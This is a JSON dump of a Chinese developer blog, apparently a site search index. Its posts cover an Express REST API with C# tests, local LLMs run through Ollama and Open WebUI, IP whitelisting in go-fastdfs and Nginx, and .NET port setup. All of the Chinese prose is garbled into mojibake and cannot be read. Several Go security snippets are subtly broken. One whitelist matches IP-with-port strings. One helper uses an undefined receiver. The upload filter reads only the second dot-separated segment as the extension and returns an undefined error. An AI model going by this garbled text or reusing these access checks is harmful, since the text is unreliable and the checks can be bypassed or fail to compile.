åˆå§‹åŒ–é¡¹ç›®é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ç›®å½•å¹¶è¿›å…¥è¯¥ç›®å½•ï¼š 12mkdir myapicd myapi ç„¶ååˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ Node.js é¡¹ç›®ï¼š 1npm init -y 2. å®‰è£…ä¾èµ–å®‰è£… Express.js ä½œä¸ºæˆ‘ä»¬çš„ Web æ¡†æ¶ï¼š 1npm install express 3. åˆ›å»ºä¸»æ–‡ä»¶åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º index.js çš„æ–‡ä»¶ï¼š 1touch index.js 4. ç¼–å†™ RESTful API ä»£ç åœ¨ index.js ä¸­ç¼–å†™ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768const express = require(&#x27;express&#x27;);const app = express();const port = 3000;app.use(express.json());let items = [ &#123; id: 1, name: &#x27;Item 1&#x27; &#125;, &#123; id: 2, name: &#x27;Item 2&#x27; &#125;, &#123; id: 3, name: &#x27;Item 3&#x27; &#125;];// è·å–æ‰€æœ‰é¡¹ç›®app.get(&#x27;/items&#x27;, (req, res) =&gt; &#123; res.json(items);&#125;);// è·å–å•ä¸ªé¡¹ç›®app.get(&#x27;/items/:id&#x27;, (req, res) =&gt; &#123; const id = parseInt(req.params.id); const item = items.find(i =&gt; i.id === id); if (item) &#123; res.json(item); &#125; else &#123; res.status(404).send(&#x27;Item not found&#x27;); &#125;&#125;);// åˆ›å»ºæ–°é¡¹ç›®app.post(&#x27;/items&#x27;, (req, res) =&gt; &#123; const newItem = &#123; id: items.length + 1, name: req.body.name &#125;; items.push(newItem); res.status(201).json(newItem);&#125;);// æ›´æ–°é¡¹ç›®app.put(&#x27;/items/:id&#x27;, (req, res) =&gt; &#123; const id = parseInt(req.params.id); const item = items.find(i =&gt; i.id === id); if (item) &#123; item.name = req.body.name; res.json(item); &#125; else &#123; res.status(404).send(&#x27;Item not found&#x27;); &#125;&#125;);// åˆ é™¤é¡¹ç›®app.delete(&#x27;/items/:id&#x27;, (req, res) =&gt; &#123; const id = parseInt(req.params.id); const itemIndex = items.findIndex(i =&gt; i.id === id); if (itemIndex !== -1) &#123; items.splice(itemIndex, 1); res.status(204).send(); &#125; else &#123; res.status(404).send(&#x27;Item not found&#x27;); &#125;&#125;);app.listen(port, () =&gt; &#123; console.log(`Server is running on http://localhost:$&#123;port&#125;`);&#125;); è¿è¡ŒæœåŠ¡å™¨åœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨æœåŠ¡å™¨ï¼š12node index.js ç°åœ¨ï¼ŒæœåŠ¡å™¨åº”è¯¥åœ¨ http://localhost:3000 ä¸Šè¿è¡Œ ä»¥ä¸‹æ˜¯ API ç«¯ç‚¹çš„ç®€è¦è¯´æ˜ï¼šï‚·GET &#x2F;items - è·å–æ‰€æœ‰é¡¹ç›®ï‚·GET &#x2F;items&#x2F;:id - è·å–å•ä¸ªé¡¹ç›®ï‚·POST &#x2F;items - åˆ›å»ºæ–°é¡¹ç›®ï‚·PUT &#x2F;items&#x2F;:id - æ›´æ–°é¡¹ç›®ï‚·DELETE &#x2F;items&#x2F;:id - åˆ é™¤é¡¹ç›® å•å…ƒæµ‹è¯•ã€‚1. åˆ›å»º C# é¡¹ç›®é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ xUnit æµ‹è¯•é¡¹ç›®ï¼š 123dotnet new xunit -n MyApiTestscd MyApiTests 2. å®‰è£… RestSharpå®‰è£… RestSharp åº“ï¼Œå®ƒå°†ç”¨äºå‘é€ HTTP è¯·æ±‚ï¼š 1dotnet add package RestSharp 3. ç¼–å†™å•å…ƒæµ‹è¯•åœ¨ MyApiTests é¡¹ç›®ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º ApiTests.cs çš„æ–‡ä»¶ï¼Œå¹¶ç¼–å†™ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364using RestSharp;using System.Threading.Tasks;using Xunit;public class ApiTests&#123; private const string BaseUrl = &quot;http://localhost:3000&quot;; [Fact] public async Task Test_GetAllItems() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items&quot;, Method.Get); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;Item 1&quot;, response.Content); &#125; [Fact] public async Task Test_GetSingleItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items/1&quot;, Method.Get); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;Item 1&quot;, response.Content); &#125; [Fact] public async Task Test_CreateNewItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items&quot;, Method.Post); request.AddJsonBody(new &#123; name = &quot;New Item&quot; &#125;); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;New Item&quot;, response.Content); &#125; [Fact] public async Task Test_UpdateItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items/1&quot;, Method.Put); request.AddJsonBody(new &#123; name = &quot;Updated Item&quot; &#125;); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(&quot;Updated Item&quot;, response.Content); &#125; [Fact] public async Task Test_DeleteItem() &#123; var client = new RestClient(BaseUrl); var request = new RestRequest(&quot;items/1&quot;, Method.Delete); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); &#125;&#125; è¿è¡Œæµ‹è¯•åœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œæµ‹è¯•ï¼š1dotnet test æ‰§è¡Œæ‰€æœ‰æµ‹è¯•ï¼Œå¹¶æ˜¾ç¤ºæµ‹è¯•ç»“æœã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"ollama gpt qwen gemma2 deepseek loacl AI","slug":"ollama-gpt-qwen-gemma2-deepseek-loacl-AI","date":"2024-07-26T15:33:08.000Z","updated":"2024-07-26T15:34:26.000Z","comments":true,"path":"2024/07/26/ollama-gpt-qwen-gemma2-deepseek-loacl-AI/","permalink":"https://banjinmei.github.io/2024/07/26/ollama-gpt-qwen-gemma2-deepseek-loacl-AI/","excerpt":"","text":"https://ollama.com/ollama https://ollama.com/librarymodels 12ollama run qwen2 send a message 12ollama run gemma2 https://github.com/open-webui/open-webuiwebui 1docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main Nå¡ gpu 1docker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda http://localhost:3000/ https://ollama.com/library/deepseek-coder-v2deepseek-coder-v2 ~~codeqwensqlcoder curl -X POST http://localhost:11434/api/generate -d â€˜{ â€œmodelâ€: â€œllama2-chinese:7b-chat-q4_0â€, â€œpromptâ€:â€ä¸ºä»€ä¹ˆå¤©ç©ºæ˜¯è“è‰²çš„â€ }â€™ https://docs.openwebui.com/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"ollama","slug":"ollama","permalink":"https://banjinmei.github.io/tags/ollama/"}],"author":"mu"},{"title":"Gofastdfs whitelist","slug":"Gofastdfs-whitelist","date":"2024-07-25T15:46:59.000Z","updated":"2024-12-07T18:19:00.094Z","comments":true,"path":"2024/07/25/Gofastdfs-whitelist/","permalink":"https://banjinmei.github.io/2024/07/25/Gofastdfs-whitelist/","excerpt":"","text":"åœ¨go-fastdfsé¡¹ç›®ä¸­ï¼Œè¦å®ç°IPç™½åå•é™åˆ¶ä¸Šä¼ åŠŸèƒ½ï¼Œä½ éœ€è¦åœ¨å¤„ç†ä¸Šä¼ è¯·æ±‚çš„åœ°æ–¹è¿›è¡Œæ£€æŸ¥ã€‚æ ¹æ®ä½ æä¾›çš„ä»£ç ï¼Œä¸Šä¼ é€»è¾‘ä¸»è¦åœ¨server.goæ–‡ä»¶ä¸­çš„HttpHandlerçš„ServeHTTPæ–¹æ³•é‡Œé€šè¿‡è°ƒç”¨mux.ServeHTTP(res, req)æ¥åˆ†å‘è¯·æ±‚åˆ°ä¸åŒçš„å¤„ç†å‡½æ•°ã€‚ IPç™½åå•é™åˆ¶å®šä¹‰ç™½åå•ï¼šé¦–å…ˆéœ€è¦å®šä¹‰ä¸€ä¸ªå˜é‡æ¥å­˜å‚¨å…è®¸çš„IPåœ°å€ã€‚å¯ä»¥åœ¨server.goçš„Serverç»“æ„ä½“ä¸­æ·»åŠ ä¸€ä¸ªå­—æ®µæ¥å­˜å‚¨è¿™ä¸ªç™½åå•ã€‚ 123456789101112131415type Server struct &#123; // ... å…¶ä»–å­—æ®µ ... allowedIPs map[string]struct&#123;&#125;&#125;func NewServer() *Server &#123; server := &amp;Server&#123; // ... åˆå§‹åŒ–å…¶ä»–å­—æ®µ ... allowedIPs: make(map[string]struct&#123;&#125;), &#125; // å‡è®¾å…è®¸çš„IPæ˜¯ &quot;192.168.1.1&quot; å’Œ &quot;10.12.188.85&quot; server.allowedIPs[&quot;192.168.1.1&quot;] = struct&#123;&#125;&#123;&#125; server.allowedIPs[&quot;10.12.188.85&quot;] = struct&#123;&#125;&#123;&#125; return server&#125; ä¿®æ”¹HttpHandlerï¼šåœ¨HttpHandlerçš„ServeHTTPæ–¹æ³•ä¸­æ·»åŠ ä¸€ä¸ªæ£€æŸ¥é€»è¾‘ï¼Œä»¥ç¡®å®šè¯·æ±‚çš„IPæ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚ 123456789101112131415func (httpHandler *HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) &#123; if !server.isIPAllowed(req) &#123; http.Error(res, &quot;Access denied&quot;, http.StatusForbidden) return &#125; // åŸæœ‰çš„å¤„ç†é€»è¾‘ mux.ServeHTTP(res, req)&#125;func (server *Server) isIPAllowed(req *http.Request) bool &#123; clientIP := req.RemoteAddr // æ£€æŸ¥IPæ˜¯å¦åœ¨ç™½åå•ä¸­ _, allowed := server.allowedIPs[clientIP] return allowed&#125; è°ƒç”¨ä¿®æ”¹åçš„NewServerï¼šç¡®ä¿åœ¨åˆå§‹åŒ–æœåŠ¡å™¨æ—¶ä½¿ç”¨ä¿®æ”¹åçš„NewServerå‡½æ•°æ¥åˆ›å»ºServerå®ä¾‹ï¼Œå¹¶è®¾ç½®ç™½åå•ã€‚ æ›´æ–°InitServerå‡½æ•°ï¼šåœ¨InitServerå‡½æ•°ä¸­ï¼Œç¡®ä¿ä½¿ç”¨ä¿®æ”¹åçš„NewServerå‡½æ•°ã€‚ 1234567func InitServer() &#123; // ... çœç•¥å…¶ä»–ä»£ç  ... server = NewServer() // ä½¿ç”¨ä¿®æ”¹åçš„æ„é€ å‡½æ•° // ... çœç•¥å…¶ä»–ä»£ç  ...&#125; é‡æ–°ç¼–è¯‘å’Œéƒ¨ç½²ï¼šå¯¹é¡¹ç›®è¿›è¡Œé‡æ–°ç¼–è¯‘ï¼Œå¹¶éƒ¨ç½²ä¿®æ”¹åçš„ä»£ç ã€‚è¿™æ ·ï¼Œä»»ä½•ä¸ç¬¦åˆç™½åå•ä¸­çš„IPåœ°å€çš„ä¸Šä¼ è¯·æ±‚éƒ½å°†è¢«æ‹’ç»ï¼Œè¿”å›HTTPçŠ¶æ€403 Forbiddenã€‚è¯·æ ¹æ®ä½ çš„é¡¹ç›®ç»“æ„å’Œé…ç½®é€‚å½“è°ƒæ•´ä¸Šè¿°ä»£ç ã€‚ åªé™åˆ¶uploadå¦‚æœä½ æƒ³åªå¯¹ç‰¹å®šçš„æ¥å£ï¼ˆå¦‚ &#x2F;group1&#x2F;uploadï¼‰å®æ–½IPç™½åå•é™åˆ¶ï¼Œè€Œä¸å½±å“å…¶ä»–é¡µé¢æˆ–å›¾ç‰‡çš„è®¿é—®ï¼Œä½ å¯ä»¥åœ¨å¤„ç†ä¸Šä¼ è¯·æ±‚çš„ç‰¹å®šè·¯ç”±ä¸­æ·»åŠ IPæ£€æŸ¥é€»è¾‘ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•å®ç°è¿™ä¸ªç›®çš„çš„æ­¥éª¤ï¼š å®šä¹‰ç™½åå•ï¼šé¦–å…ˆï¼Œå®šä¹‰ä¸€ä¸ªå˜é‡æ¥å­˜å‚¨å…è®¸ä¸Šä¼ çš„IPåœ°å€ã€‚ 12345var allowedUploadIPs = map[string]struct&#123;&#125;&#123; &quot;192.168.1.1&quot;: &#123;&#125;, &quot;10.12.188.85&quot;: &#123;&#125;, // å¯ä»¥ç»§ç»­æ·»åŠ æ›´å¤šçš„å…è®¸ä¸Šä¼ çš„IPåœ°å€&#125; ä¿®æ”¹ä¸Šä¼ å¤„ç†å‡½æ•°ï¼šæ‰¾åˆ°å¤„ç† &#x2F;group1&#x2F;upload è·¯ç”±çš„å‡½æ•°ï¼Œè¿™å¯èƒ½æ˜¯ Server ç»“æ„ä½“çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ¯”å¦‚ Upload æ–¹æ³•ã€‚åœ¨è¿™ä¸ªå‡½æ•°çš„å¼€å§‹å¤„æ·»åŠ IPæ£€æŸ¥é€»è¾‘ã€‚ 1234567891011121314func (c *Server) Upload(w http.ResponseWriter, r *http.Request) &#123; if !isIPAllowed(r) &#123; http.Error(w, &quot;Access denied&quot;, http.StatusForbidden) return &#125; // åŸæœ‰çš„ä¸Šä¼ å¤„ç†é€»è¾‘ // ...&#125;func isIPAllowed(r *http.Request) bool &#123; clientIP := c.GetRealIp(r) // ç¡®ä¿è¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯è¯·æ±‚çš„IPåœ°å€ _, allowed := allowedUploadIPs[clientIP] return allowed&#125; æ›´æ–°è·¯ç”±ï¼šç¡®ä¿ä½ çš„è·¯ç”±è®¾ç½®æ­£ç¡®åœ°å°† &#x2F;group1&#x2F;upload è¯·æ±‚æ˜ å°„åˆ° Upload æ–¹æ³•ã€‚ 123456789func (c *Server) initRouter() &#123; // å…¶ä»–è·¯ç”±è®¾ç½®... // æ˜ å°„/group1/uploadåˆ°Uploadæ–¹æ³• // æ³¨æ„è¿™é‡Œçš„å…·ä½“å®ç°å¯èƒ½ä¾èµ–äºä½ ä½¿ç”¨çš„HTTPå¤šè·¯å¤ç”¨å™¨æˆ–æ¡†æ¶ mux.HandleFunc(&quot;/group1/upload&quot;, c.Upload)&#125; ä¸è¦åœ¨å…¶ä»–è·¯ç”±ä¸­æ·»åŠ IPæ£€æŸ¥ï¼šç¡®ä¿åªæœ‰ &#x2F;group1&#x2F;upload è·¯ç”±çš„å¤„ç†å‡½æ•°ä¸­æ·»åŠ äº†IPæ£€æŸ¥é€»è¾‘ã€‚å…¶ä»–è·¯ç”±çš„å¤„ç†å‡½æ•°ä¿æŒä¸å˜ï¼Œè¿™æ ·å°±ä¸ä¼šå¯¹å…¶ä»–é¡µé¢æˆ–å›¾ç‰‡çš„è®¿é—®é€ æˆå½±å“ã€‚ é‡æ–°ç¼–è¯‘å’Œéƒ¨ç½²ï¼šå¯¹é¡¹ç›®è¿›è¡Œé‡æ–°ç¼–è¯‘ï¼Œå¹¶éƒ¨ç½²ä¿®æ”¹åçš„ä»£ç ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ï¼Œåªæœ‰å½“ç”¨æˆ·å°è¯•è®¿é—® &#x2F;group1&#x2F;upload æ¥å£æ—¶ï¼Œæ‰ä¼šæ£€æŸ¥IPç™½åå•ï¼›å…¶ä»–æ‰€æœ‰è·¯ç”±å’Œèµ„æºçš„è®¿é—®éƒ½ä¸ä¼šå—åˆ°IPç™½åå•çš„é™åˆ¶ã€‚è¯·æ ¹æ®ä½ çš„å®é™…ä»£ç ç»“æ„å’Œè·¯ç”±è®¾ç½®é€‚å½“è°ƒæ•´ä¸Šè¿°ç¤ºä¾‹ä»£ç ã€‚ å¿½ç•¥ç«¯å£HTTPè¯·æ±‚çš„è¿œç¨‹åœ°å€ï¼ˆr.RemoteAddrï¼‰é€šå¸¸åŒ…å«IPåœ°å€å’Œç«¯å£å·ï¼Œæ ¼å¼å¦‚IP:PORTã€‚å¦‚æœä½ å¸Œæœ›åœ¨æ£€æŸ¥IPç™½åå•æ—¶å¿½ç•¥ç«¯å£å·ï¼Œåªæ ¹æ®IPåœ°å€æ¥åˆ¤æ–­ï¼Œä½ éœ€è¦ä»r.RemoteAddrä¸­æå–å‡ºIPåœ°å€éƒ¨åˆ†ã€‚ åœ¨Goè¯­è¨€ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨strings.Splitå‡½æ•°æ¥åˆ†å‰²å­—ç¬¦ä¸²ï¼Œè·å–IPåœ°å€ã€‚ä»¥ä¸‹æ˜¯è°ƒæ•´åçš„isIPAllowedå‡½æ•°ï¼š 12345678910111213func (server *Server) isIPAllowed(r *http.Request) bool &#123; clientIPPort := r.RemoteAddr // åŒ…å«IPå’Œç«¯å£å·ï¼Œä¾‹å¦‚ &quot;192.168.80.123:56533&quot; clientIPParts := strings.Split(clientIPPort, &quot;:&quot;) // åˆ†å‰²ä¸º [&quot;192.168.80.123&quot;, &quot;56533&quot;] if len(clientIPParts) &lt; 2 &#123; // å¦‚æœåˆ†å‰²åçš„ç»“æœä¸è¶³2éƒ¨åˆ†ï¼Œè¯´æ˜æ²¡æœ‰ç«¯å£å·ï¼Œç›´æ¥è¿”å›ä¸å…è®¸ return false &#125; clientIP := clientIPParts[0] // æå–IPåœ°å€ // æ£€æŸ¥IPæ˜¯å¦åœ¨ç™½åå•ä¸­ _, allowed := server.allowedIPs[clientIP] return allowed&#125; è¿™æ®µä»£ç é¦–å…ˆå°†r.RemoteAddræŒ‰ç…§â€:â€åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯IPåœ°å€ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯ç«¯å£å·ã€‚ç„¶åï¼Œå®ƒæ£€æŸ¥åˆ†å‰²åçš„æ•°ç»„é•¿åº¦æ˜¯å¦è‡³å°‘ä¸º2ï¼Œä»¥ç¡®ä¿ç«¯å£å·å­˜åœ¨ã€‚å¦‚æœé•¿åº¦å°äº2ï¼Œåˆ™å¯èƒ½è¡¨ç¤ºè¿œç¨‹åœ°å€æ ¼å¼ä¸æ­£ç¡®ï¼Œæ­¤æ—¶å‡½æ•°è¿”å›falseï¼Œè¡¨ç¤ºä¸å…è®¸è®¿é—®ã€‚å¦‚æœé•¿åº¦è¶³å¤Ÿï¼Œå®ƒå°†å–å‡ºIPåœ°å€éƒ¨åˆ†ï¼Œå¹¶æ£€æŸ¥è¯¥IPæ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚ è¯·ç¡®ä¿server.allowedIPså·²ç»è¢«æ­£ç¡®åˆå§‹åŒ–å¹¶åŒ…å«äº†æ‰€æœ‰å…è®¸çš„IPåœ°å€ã€‚ä¾‹å¦‚ï¼š 1234server.allowedIPs = map[string]struct&#123;&#125;&#123; &quot;192.168.80.123&quot;: &#123;&#125;, // å…è®¸çš„IPåœ°å€ // å¯ä»¥ç»§ç»­æ·»åŠ æ›´å¤šçš„IPåœ°å€&#125; è¿™æ ·ï¼ŒisIPAllowedå‡½æ•°å°±å¯ä»¥æ ¹æ®IPåœ°å€è€Œä¸æ˜¯IPå’Œç«¯å£çš„ç»„åˆæ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦è¢«å…è®¸ã€‚ å¤ä¹ 1234567891011121314151617 //http.DefaultServeMux.ServeHTTP(res, req) if !server.isIPAllowed(req) &#123; http.Error(res, &quot;Access denied&quot;, http.StatusForbidden) return &#125; mux.ServeHTTP(res,req)func (server *Server) isIPAllowed(req *http.Request) bool &#123; clientIP := req.RemoteAddr fmt.Println(&quot;ip &quot; + clientIP) // æ£€æŸ¥IPæ˜¯å¦åœ¨ç™½åå•ä¸­ _, allowed := server.allowedIPs[clientIP] return allowed&#125; http_upload.go 12345678func (c *Server) Upload(w http.ResponseWriter, r *http.Request) &#123; if !server.isIPAllowed(r) &#123; http.Error(w, &quot;Access denied&quot;, http.StatusForbidden) return &#125;&#125; è¦ç‚¹ 1func (c *Server) Upload(w http.ResponseWriter, r *http.Request) &#123; //æƒé™IP é™åˆ¶æ–‡ä»¶ç±»å‹12345678910func (c *Server) SaveUploadFile(file multipart.File, header *multipart.FileHeader, fileInfo *FileInfo, r *http.Request) (*FileInfo, error) &#123; _, fileInfo.Name = filepath.Split(header.Filename) //å¦‚æœä¸æ˜¯ jpg png data åˆ™ä¸è®©ä¸Šä¼  fileInfo.Name = c.TrimFileNameSpecialChar(fileInfo.Name) fmt.Println(&quot;fname- &quot; +fileInfo.Name) extension := strings.Split(fileInfo.Name, &quot;.&quot;)[1] if extension != &quot;jpg&quot; &amp;&amp; extension != &quot;png&quot; &amp;&amp; extension != &quot;data&quot; &#123; fmt.Println(&quot;fnameext- &quot; +extension) return fileInfo, err &#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"}],"author":"mu"},{"title":"Nginx whitelist","slug":"Nginx-whitelist","date":"2024-07-23T15:56:32.000Z","updated":"2024-07-23T15:59:02.000Z","comments":true,"path":"2024/07/23/Nginx-whitelist/","permalink":"https://banjinmei.github.io/2024/07/23/Nginx-whitelist/","excerpt":"","text":"åœ¨ Debian ç³»ç»Ÿä¸Šå®‰è£… Nginx æ›´æ–°åŒ…åˆ—è¡¨ï¼š 1sudo apt update å®‰è£… Nginxï¼šä½¿ç”¨ apt åŒ…ç®¡ç†å™¨æ¥å®‰è£… Nginxã€‚ 1sudo apt install nginx å¯åŠ¨ Nginxï¼š 1sudo systemctl start nginx å¯ç”¨å¼€æœºè‡ªå¯åŠ¨ï¼š 1sudo systemctl enable nginx æ£€æŸ¥ Nginx çŠ¶æ€ï¼š 1sudo systemctl status nginx é…ç½®é˜²ç«å¢™ï¼ˆå¯é€‰ï¼‰ï¼š 1sudo ufw allow &#x27;Nginx Full&#x27; è®¿é—®ä½ çš„æœåŠ¡å™¨ï¼šå®‰è£…å®Œæˆåï¼Œä½ å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®ä½ çš„æœåŠ¡å™¨ IP åœ°å€æ¥éªŒè¯ Nginx æ˜¯å¦å®‰è£…æˆåŠŸã€‚ä½ åº”è¯¥ä¼šçœ‹åˆ°é»˜è®¤çš„ Nginx æ¬¢è¿é¡µé¢ã€‚ é…ç½® HTTPSï¼ˆå¯é€‰ï¼‰ å¦‚æœä½ å¸Œæœ›ä½¿ç”¨ HTTPSï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š è·å– SSL è¯ä¹¦ï¼šå¯ä»¥ä½¿ç”¨ Letâ€™s Encrypt å…è´¹è·å–ä¸€ä¸ª SSL è¯ä¹¦ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®‰è£… Certbot å’Œ Nginx æ’ä»¶ï¼š 12sudo apt install certbot python3-certbot-nginx è·å–å¹¶å®‰è£…è¯ä¹¦ï¼šè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥è·å–å¹¶å®‰è£…è¯ä¹¦ï¼š 1sudo certbot --nginx -d yourdomain.com è¯·å°† yourdomain.com æ›¿æ¢ä¸ºä½ çš„å®é™…åŸŸåã€‚ é…ç½®è‡ªåŠ¨æ›´æ–°è¯ä¹¦ï¼šä½ å¯ä»¥è®¾ç½®ä¸€ä¸ª cron ä»»åŠ¡æ¥è‡ªåŠ¨æ›´æ–°è¯ä¹¦ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼š 1sudo systemctl enable certbot-renewal 12sudo nano /etc/nginx/sites-available/fastdfs åœ¨æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š nginx 12345678910111213141516server &#123; listen 80; server_name yourdomain.com; # å…è®¸çš„IPåœ°å€åˆ—è¡¨ allow 192.168.1.0/24; allow 10.0.0.0/8; deny all; location /group1/M00 &#123; proxy_pass http://localhost:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; è¯·å°† yourdomain.com æ›¿æ¢ä¸ºä½ çš„å®é™…åŸŸåï¼Œå¹¶ç¡®ä¿ IP åœ°å€åˆ—è¡¨ä¸ä½ çš„éœ€æ±‚åŒ¹é…ã€‚ 123sudo systemctl stop nginxsudo systemctl start nginx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://banjinmei.github.io/tags/Nginx/"}],"author":"mu"},{"title":".NET Web Port","slug":"NET-Web-Port","date":"2024-06-26T17:02:56.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/27/NET-Web-Port/","permalink":"https://banjinmei.github.io/2024/06/27/NET-Web-Port/","excerpt":"","text":"åœ¨ .NET8 ä¸­ï¼Œåœ¨ Program ç±»ä¸­é…ç½®æœåŠ¡å’Œè¯·æ±‚ç®¡é“ ç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435363738using Microsoft.AspNetCore.Builder;using Microsoft.AspNetCore.Hosting;using Microsoft.Extensions.DependencyInjection;using Microsoft.Extensions.Hosting;namespace WServer&#123; public class Program &#123; public static void Main(string[] args) &#123; var builder = WebApplication.CreateBuilder(args); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); // Configure the HTTP request pipeline. if (!app.Environment.IsDevelopment()) &#123; app.UseExceptionHandler(&quot;/Home/Error&quot;); &#125; app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); app.MapControllerRoute( name: &quot;default&quot;, pattern: &quot;&#123;controller=Home&#125;/&#123;action=Index&#125;/&#123;id?&#125;&quot;); // è®¾ç½®é»˜è®¤å¯åŠ¨ç«¯å£ app.Urls.Add(&quot;http://localhost:5000&quot;); // è¿™é‡Œè®¾ç½®ä¸º 5000 app.Run(); &#125; &#125;&#125; å¯åŠ¨æ—¶è‡ªåŠ¨ä»ç¯å¢ƒå˜é‡æˆ–é…ç½®æ–‡ä»¶ä¸­è¯»å–ç«¯å£å· 12var port = Environment.GetEnvironmentVariable(&quot;ASPNETCORE_PORT&quot;) ?? &quot;5000&quot;;app.Urls.Add($&quot;http://localhost:&#123;port&#125;&quot;); ä¹Ÿå¯ä»¥ä»é…ç½®æ–‡ä»¶ä¸­è¯»å–ç«¯å£å·ï¼Œä¾‹å¦‚ appsettings.jsonï¼š 123var port = builder.Configuration.GetValue&lt;int&gt;(&quot;Port&quot;).ToString();app.Urls.Add($&quot;http://localhost:&#123;port&#125;&quot;); å¤šç«¯å£å·123456789// é…ç½® IConfiguration var configuration = builder.Configuration; // è¯»å–ç«¯å£é…ç½®åˆ—è¡¨ var ports = configuration.GetSection(&quot;Ports&quot;).Get&lt;List&lt;int&gt;&gt;() ?? new List&lt;int&gt;(); foreach (var port in ports) &#123; app.Urls.Add($&quot;http://localhost:&#123;port&#125;&quot;); &#125; appsettings.json æ–‡ä»¶åŒ…å«äº†ä¸€ä¸ªç«¯å£åˆ—è¡¨ï¼š 123&#123; &quot;Ports&quot;: [5000, 5001] // é…ç½®å¤šä¸ªç«¯å£&#125; debianå½“ä½ åœ¨ Debian ç³»ç»Ÿä¸Šè¿è¡Œ dotnet run å¹¶èƒ½å¤Ÿé€šè¿‡ http://localhost:5000 è®¿é—®åº”ç”¨ç¨‹åºï¼Œä½†æ— æ³•é€šè¿‡ IP:5000 è®¿é—®æ—¶ï¼Œè¿™é€šå¸¸æ„å‘³ç€ä½ çš„åº”ç”¨ç¨‹åºåªç»‘å®šåˆ°äº†æœ¬åœ°å›ç¯æ¥å£ï¼ˆå³ localhostï¼‰ï¼Œè€Œæ²¡æœ‰ç»‘å®šåˆ°æ‰€æœ‰å¯ç”¨çš„ç½‘ç»œæ¥å£ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼š ç¡®ä¿åº”ç”¨ç¨‹åºç»‘å®šåˆ°æ‰€æœ‰æ¥å£ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒASP.NET Core åº”ç”¨ç¨‹åºåº”è¯¥ç›‘å¬æ‰€æœ‰å¯ç”¨çš„ç½‘ç»œæ¥å£ã€‚å¦‚æœä½ çš„åº”ç”¨ç¨‹åºåªç»‘å®šåˆ° localhostï¼Œä½ éœ€è¦ç¡®ä¿å®ƒç»‘å®šåˆ° 0.0.0.0ï¼Œè¿™ä»£è¡¨æ‰€æœ‰ç½‘ç»œæ¥å£ã€‚åœ¨ Program ç±»ä¸­è®¾ç½® app.Urls 